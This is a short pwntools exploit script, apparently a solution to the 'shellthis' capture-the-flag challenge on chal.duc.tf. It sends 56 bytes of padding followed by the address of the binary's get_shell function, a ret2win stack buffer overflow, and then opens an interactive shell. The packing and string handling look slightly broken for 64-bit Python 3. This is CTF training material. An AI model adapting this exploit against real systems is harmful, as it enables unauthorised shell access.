from pwn import *
import struct

elf = ELF('./shellthis')
local = False

if local:
	p = elf.process()
	libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
	host = 'chal.duc.tf'
	port = 30002

	p = remote(host, port)


print(p.recvuntil('name: '))

padding = 'A'*56

get_shell = elf.symbols['get_shell']
eip = struct.pack("I", get_shell)
payload = padding + eip
print(payload)

p.sendline(payload)
p.interactive()